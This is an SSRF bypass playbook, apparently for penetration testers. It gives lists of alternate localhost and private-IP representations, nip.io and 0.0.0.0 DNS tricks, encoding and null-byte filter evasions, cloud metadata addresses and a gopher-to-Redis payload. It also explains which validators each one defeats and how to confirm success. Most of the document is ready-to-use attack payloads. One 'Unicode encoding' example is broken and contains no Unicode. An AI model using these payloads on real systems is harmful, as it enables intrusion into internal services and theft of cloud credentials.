# SSRF — Localhost & Private-IP Bypass

## When this applies

- Application fetches a URL from user input (image, webhook, RSS, profile picture).
- Server has a blocklist for `127.0.0.1`, `localhost`, private IP ranges.
- Goal: reach internal services despite the blocklist.

## Technique

Use alternate IP representations (decimal, hex, octal, IPv6, shorthand), DNS-based bypasses (`0.0.0.0`, nip.io), and encoding tricks. Bypass naive string-based validators that check the literal hostname rather than DNS-resolved IP.

## Steps

### Localhost variants

```bash
# Standard representations
http://127.0.0.1/
http://localhost/
http://0.0.0.0/

# Shorthand notation
http://127.1/
http://127.0.1/
http://0/

# Decimal notation (127.0.0.1 → decimal)
http://2130706433/

# Hexadecimal notation
http://0x7f000001/
http://0x7f.0x00.0x00.0x01/

# Octal notation
http://017700000001/
http://0177.0.0.1/

# IPv6 localhost
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/

# Mixed encoding
http://0x7f.0.0.1/
http://127.000.000.001/

# Domain-based
http://localhost.localdomain/
http://127.0.0.1.nip.io/

# nip.io magic-prefix (hex-encoded IP, no decimal substring in the hostname)
http://magic-7f000001.nip.io/            # → 127.0.0.1, hostname has no banned dot-quad
http://magic-0a000001.nip.io/            # → 10.0.0.1
http://magic-c0a80001.nip.io/            # → 192.168.0.1

# Custom domain → 0.0.0.0 (bypasses string-based IP validation)
http://ssrf.yourdomain.com/              # A record → 0.0.0.0
```

> **nip.io magic-prefix**: when the blacklist greps the URL string for `127.`, `10.`, `172.16.`, `192.168.`, or `0.0.0.0` *before* DNS resolution, the magic-`<8hex>` form contains no banned substring (no decimal octets, no dots-in-IP) and resolves to the encoded IP. Especially useful for K8s pod / Docker container IPs read from `/server-status`, `/proc/net/fib_trie`, or `metadata.google.internal` — encode the discovered IP as hex and prefix `magic-`. Reliable one-shot alternative to DNS-rebinding (`0.0.0.0.1`, `rbndr.us`), which is fragile against modern resolvers.

> **0.0.0.0 DNS bypass**: When validators check the hostname *string* (e.g., PHP `filter_var($host, FILTER_VALIDATE_IP)`) but not DNS resolution, a domain resolving to `0.0.0.0` bypasses IP blocklists entirely — the validator sees a domain name, not an IP. On Linux, `0.0.0.0` routes to localhost. Register your own domain with `A → 0.0.0.0` when wildcard DNS services (nip.io, sslip.io) fail inside the target network.

### Private IP ranges

```bash
# Class A (10.0.0.0/8)
http://10.0.0.1/
http://167772161/                    # Decimal

# Class B (172.16.0.0/12)
http://172.16.0.1/
http://2886729729/                   # Decimal

# Class C (192.168.0.0/16)
http://192.168.0.1/
http://3232235521/                   # Decimal
http://192.168.1/                    # Shorthand

# Link-local (169.254.0.0/16)
http://169.254.169.254/              # AWS/Azure metadata
http://169.254.1.1/                  # Shorthand
```

### URL encoding

```bash
# Single encoding
http://127.0.0.1/%61dmin             # a = %61
http://127.0.0.1/ad%6din             # m = %6d
http://127.0.0.1/admin%3Fkey%3Dvalue # ? = %3F, = = %3D

# Double encoding
http://127.0.0.1/%2561dmin           # a = %61 = %2561
http://127.0.0.1/%252561dmin         # Triple encoding

# Mixed encoding
http://127.0.0.1/ad%256din

# Unicode encoding
http://127.0.0.1/admin

# UTF-8 overlong encoding
http://127.0.0.1/%C0%AE%C0%AE/admin

# HTML entities (context-dependent)
http://127.0.0.1/&#97;dmin
```

### Bypass filters

```bash
# Case variation
http://LocalHost/
http://LOCALHOST/
http://LoCaLhOsT/

# Null byte injection
http://127.0.0.1%00/
http://trusted.com%00.attacker.com/
http://127.0.0.1%00.example.com/

# Whitespace injection
http://127.0.0.1 /admin
http://127.0.0.1%09/admin            # Tab
http://127.0.0.1%0a/admin            # Newline

# Special characters
http://127.0.0.1;/admin
http://127.0.0.1:/admin
http://127.0.0.1,/admin
```

### DNS-based IP validation bypass

```bash
# When ALL localhost IPs are blocked but validation only checks hostname strings
# (not DNS resolution results):

# Register domain with A record → 0.0.0.0
http://ssrf.yourdomain.com/               # Resolves to 0.0.0.0 → localhost on Linux
gopher://ssrf.yourdomain.com:6379/_KEYS*  # Gopher to Redis via domain

# Vulnerable pattern (PHP):
# $host = parse_url($url, PHP_URL_HOST);  // Returns "ssrf.yourdomain.com"
# if (filter_var($host, FILTER_VALIDATE_IP)) { check_blocklist($host); }
# // filter_var returns FALSE for domain names → blocklist check SKIPPED
# curl_exec($url);  // curl resolves domain → 0.0.0.0 → localhost

# Also works when:
# - Python: ipaddress.ip_address(hostname) raises ValueError for non-IPs
# - Node: net.isIP(hostname) returns 0 for domain names
# - Any validator that only checks IP-format strings
```

### Domain tricks (when localhost is blocked)

```bash
http://127.0.0.1/
http://127.1/
http://[::1]/
http://0/
http://2130706433/
http://0x7f000001/
http://localhost.localdomain/
http://127.0.0.1.nip.io/
```

## Verifying success

- Request to attacker-side `http://ssrf.yourdomain.com/` reaches the server's localhost (different response than from external).
- Internal admin panel returns 200 / its own content body.
- Out-of-band callback received on Burp Collaborator confirming SSRF path.

## Common pitfalls

- Some validators DO resolve DNS — `nip.io` returns the actual IP. Register your own A record.
- IPv6 localhost variants may not be enabled on the target — start with IPv4 representations.
- Some apps reject URLs containing only an integer — try `http://2130706433.nip.io/` if needed.

## Tools

- Burp Suite Repeater
- Burp Collaborator
- DNS rebinding services (rebinder.net, rbndr.us)
- Custom domain with A → 0.0.0.0 record
